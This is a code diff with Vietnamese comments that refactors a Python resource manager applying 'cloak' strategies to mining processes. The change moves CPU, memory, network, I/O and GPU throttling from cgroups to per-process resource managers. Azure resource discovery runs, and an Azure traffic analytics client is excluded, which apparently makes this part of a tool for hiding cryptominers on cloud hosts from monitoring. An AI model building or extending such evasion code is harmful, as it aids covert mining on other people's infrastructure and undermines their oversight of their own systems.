@@ -19,7 +19,6 @@ from readerwriterlock import rwlock
 from .base_manager import BaseManager
 from .utils import MiningProcess, GPUManager
 from .cloak_strategies import CloakStrategy, CloakStrategyFactory
-from .cgroup_manager import CgroupManager  # Import CgroupManager
 from .resource_control import ResourceControlFactory  # Import ResourceControlFactory
 
 # CHỈ GIỮ LẠI các import từ azure_clients TRỪ AzureTrafficAnalyticsClient
@@ -75,18 +74,16 @@ class SharedResourceManager:
     Lớp cung cấp các hàm điều chỉnh tài nguyên (CPU, RAM, GPU, Disk, Network...).
     Tích hợp chặt chẽ với ResourceControlFactory để quản lý các resource managers.
     """
-    def __init__(self, config: Dict[str, Any], logger: logging.Logger, cgroup_manager: CgroupManager):
+    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
         """
-        Khởi tạo SharedResourceManager với cấu hình, logger và CgroupManager.
+        Khởi tạo SharedResourceManager với cấu hình và logger.
 
         Args:
             config (Dict[str, Any]): Cấu hình tài nguyên.
             logger (logging.Logger): Logger để ghi log.
-            cgroup_manager (CgroupManager): Đối tượng quản lý cgroup v2.
         """
         self.config = config
         self.logger = logger
-        self.cgroup_manager = cgroup_manager
         self.gpu_manager = GPUManager()
         self.power_manager = PowerManager()
         self.strategy_cache = {}  # Thêm cache cho chiến lược
@@ -176,33 +173,23 @@ class SharedResourceManager:
             self.logger.error(f"Lỗi không xác định trong get_gpu_usage_percent: {e}\n{traceback.format_exc()}")
             return 0.0
 
-    def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess, cgroups: Dict[str, str]):
+    def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
         """
         Áp dụng một chiến lược cloaking cho tiến trình đã cho.
 
         Args:
             strategy_name (str): Tên của chiến lược cloaking (ví dụ: 'cpu', 'gpu', 'memory').
             process (MiningProcess): Đối tượng tiến trình khai thác.
-            cgroups (Dict[str, str]): Dictionary chứa tên các cgroup cho các controller.
         """
         try:
             pid = process.pid
             name = process.name
-
-            # Nếu không phải là chiến lược 'gpu', kiểm tra sự tồn tại của các controller cần thiết
-            if strategy_name.lower() != 'gpu':
-                required_controllers = ['cpu', 'memory', 'cache', 'network', 'io']  # Loại bỏ 'gpu'
-                for controller in required_controllers:
-                    if controller not in cgroups:
-                        self.logger.error(f"Controller '{controller}' không được định nghĩa trong cgroups cấu hình: {cgroups}")
-                        return
 
             self.logger.debug(f"Tạo strategy '{strategy_name}' cho {name} (PID={pid})")
             strategy = CloakStrategyFactory.create_strategy(
                 strategy_name,
                 self.config,
                 self.logger,
-                self.cgroup_manager,
                 self.resource_managers
             )
 
@@ -214,13 +201,9 @@ class SharedResourceManager:
                 return
 
             self.logger.info(f"Bắt đầu áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid})")
-            # Nếu là 'gpu', truyền {} cho cgroups
-            if strategy_name.lower() == 'gpu':
-                strategy.apply(process, {})
-            else:
-                strategy.apply(process, cgroups)
+            strategy.apply(process)
             self.logger.info(f"Hoàn thành áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid}).")
-            
+
         except psutil.NoSuchProcess as e:
             self.logger.error(f"Tiến trình không tồn tại: {e}")
         except psutil.AccessDenied as e:
@@ -231,30 +214,25 @@ class SharedResourceManager:
             )
             raise
 
-
     def restore_resources(self, process: MiningProcess):
         try:
             pid = process.pid
             name = process.name
-            cgroups = self.config.get('cgroups', {})
-            controllers = ['cpu', 'memory', 'cache', 'network', 'io']  # Loại bỏ 'gpu'
             restored = False
 
-            for controller in controllers:
-                cgroup_name = cgroups.get(controller, f"{controller}_cloak_{pid}")
-                if self.cgroup_manager.cgroup_exists(cgroup_name):
-                    success = self.resource_managers[controller].delete_cgroup(cgroup_name)
-                    if success:
-                        self.logger.info(f"Đã xóa cgroup '{cgroup_name}' cho PID={pid}.")
-                        restored = True
-                    else:
-                        self.logger.error(f"Không thể xóa cgroup '{cgroup_name}' cho PID={pid}.")
-            
-            # Không xử lý 'gpu' cgroup
+            # Khôi phục các tài nguyên đã điều chỉnh bằng cách sử dụng resource managers
+            for controller, manager in self.resource_managers.items():
+                success = manager.restore_resources(pid)
+                if success:
+                    self.logger.info(f"Đã khôi phục tài nguyên '{controller}' cho PID={pid}.")
+                    restored = True
+                else:
+                    self.logger.error(f"Không thể khôi phục tài nguyên '{controller}' cho PID={pid}.")
+
             if restored:
                 self.logger.info(f"Khôi phục xong tài nguyên cho {name} (PID: {pid}).")
             else:
-                self.logger.warning(f"Không tìm thấy cgroup nào để xóa cho {name} (PID: {pid}).")
+                self.logger.warning(f"Không tìm thấy tài nguyên nào để khôi phục cho {name} (PID: {pid}).")
         except psutil.NoSuchProcess:
             self.logger.error(f"Tiến trình PID={pid} không tồn tại khi khôi phục tài nguyên.")
         except psutil.AccessDenied:
@@ -301,11 +279,8 @@ class ResourceManager(BaseManager):
         self.initialize_azure_clients()
         self.discover_azure_resources()
 
-        # Khởi tạo CgroupManager
-        self.cgroup_manager = CgroupManager(logger)
-
         # Khởi tạo SharedResourceManager với resource_managers mới
-        self.shared_resource_manager = SharedResourceManager(config, logger, self.cgroup_manager)
+        self.shared_resource_manager = SharedResourceManager(config, logger)
 
         # Sử dụng ThreadPoolExecutor để quản lý các thread
         self.executor = ThreadPoolExecutor(max_workers=10)  # Tăng số worker để xử lý cả cloaking và restoration
@@ -335,15 +310,9 @@ class ResourceManager(BaseManager):
         self.stop_event.set()
         self.executor.shutdown(wait=True)
         self.shared_resource_manager.shutdown_nvml()
-        # Xóa các cgroup đã tạo nếu cần
+        # Khôi phục tài nguyên đã điều chỉnh nếu cần
         for proc in self.mining_processes:
-            for controller in ['cpu', 'cache', 'network', 'io']:
-                cgroup_name = self.config.get('cgroups', {}).get(controller, f"{controller}_cloak_{proc.pid}")
-                try:
-                    self.shared_resource_manager.resource_managers[controller].delete_cgroup(cgroup_name)
-                    self.logger.info(f"Xóa cgroup '{cgroup_name}' cho PID={proc.pid}.")
-                except Exception as e:
-                    self.logger.error(f"Lỗi khi xóa cgroup '{cgroup_name}' cho PID={proc.pid}: {e}")
+            self.shared_resource_manager.restore_resources(proc)
         self.logger.info("ResourceManager đã dừng.")
         shutdown_power_management()  # Gọi hàm shutdown_power_management trực tiếp
 
@@ -638,17 +607,17 @@ class ResourceManager(BaseManager):
         """
         try:
             if adjustments.get('cpu_cloak'):
-                self.shared_resource_manager.apply_cloak_strategy('cpu', process, self.config.get('cgroups', {}))
+                self.shared_resource_manager.apply_cloak_strategy('cpu', process)
             if adjustments.get('gpu_cloak'):
-                self.shared_resource_manager.apply_cloak_strategy('gpu', process, {})
+                self.shared_resource_manager.apply_cloak_strategy('gpu', process)
             if adjustments.get('network_cloak'):
-                self.shared_resource_manager.apply_cloak_strategy('network', process, self.config.get('cgroups', {}))
+                self.shared_resource_manager.apply_cloak_strategy('network', process)
             if adjustments.get('io_cloak'):
-                self.shared_resource_manager.apply_cloak_strategy('io', process, self.config.get('cgroups', {}))
+                self.shared_resource_manager.apply_cloak_strategy('io', process)
             if adjustments.get('cache_cloak'):
-                self.shared_resource_manager.apply_cloak_strategy('cache', process, self.config.get('cgroups', {}))
+                self.shared_resource_manager.apply_cloak_strategy('cache', process)
             if adjustments.get('memory_cloak'):
-                self.shared_resource_manager.apply_cloak_strategy('memory', process, self.config.get('cgroups', {}))
+                self.shared_resource_manager.apply_cloak_strategy('memory', process)
 
             self.logger.info(
                 f"Áp dụng điều chỉnh monitor cho {process.name} (PID: {process.pid})."
@@ -670,20 +639,15 @@ class ResourceManager(BaseManager):
                                 strategy,
                                 self.config,
                                 self.logger,
-                                self.cgroup_manager,
-                                self.shared_resource_manager.resource_managers
+                                self.resource_managers
                             )
                             self.shared_resource_manager.strategy_cache[strategy] = strategy_instance
                         else:
                             strategy_instance = self.shared_resource_manager.strategy_cache[strategy]
 
                         if strategy_instance and callable(getattr(strategy_instance, 'apply', None)):
-                            if strategy == 'gpu':
-                                self.logger.info(f"Áp dụng chiến lược '{strategy}' cho PID={task['process'].pid} mà không dùng cgroup.")
-                                strategy_instance.apply(task['process'], {})  # Không truyền cgroups
-                            else:
-                                self.logger.info(f"Áp dụng chiến lược '{strategy}' cho PID={task['process'].pid}")
-                                strategy_instance.apply(task['process'], self.config.get('cgroups', {}))
+                            self.logger.info(f"Áp dụng chiến lược '{strategy}' cho PID={task['process'].pid}")
+                            strategy_instance.apply(task['process'])
                         else:
                             self.logger.error(f"Không thể áp dụng chiến lược '{strategy}' cho PID={task['process'].pid}")
                 elif task['type'] == 'restoration':
@@ -725,7 +689,7 @@ class ResourceManager(BaseManager):
 
             # Lấy metrics memory nếu cần
             memory_limit_mb = self.shared_resource_manager.resource_managers['memory'].get_memory_limit(
-                self.config.get('cgroups', {}).get('memory', f"memory_cloak_{process.pid}")
+                process.pid
             ) / (1024**2) if self.shared_resource_manager.resource_managers.get('memory') else 0.0
 
             metrics = {
@@ -800,14 +764,8 @@ class ResourceManager(BaseManager):
         self.stop_event.set()
         self.executor.shutdown(wait=True)
         self.shared_resource_manager.shutdown_nvml()  # Sử dụng GPUManager để shutdown NVML
-        # Xóa các cgroup đã tạo nếu cần
+        # Khôi phục tài nguyên đã điều chỉnh nếu cần
         for proc in self.mining_processes:
-            for controller in ['cpu', 'cache', 'network', 'io']:
-                cgroup_name = self.config.get('cgroups', {}).get(controller, f"{controller}_cloak_{proc.pid}")
-                try:
-                    self.shared_resource_manager.resource_managers[controller].delete_cgroup(cgroup_name)
-                    self.logger.info(f"Xóa cgroup '{cgroup_name}' cho PID={proc.pid}.")
-                except Exception as e:
-                    self.logger.error(f"Lỗi khi xóa cgroup '{cgroup_name}' cho PID={proc.pid}: {e}")
+            self.shared_resource_manager.restore_resources(proc)
         self.logger.info("ResourceManager đã dừng.")
         shutdown_power_management()  # Gọi hàm shutdown_power_management trực tiếp
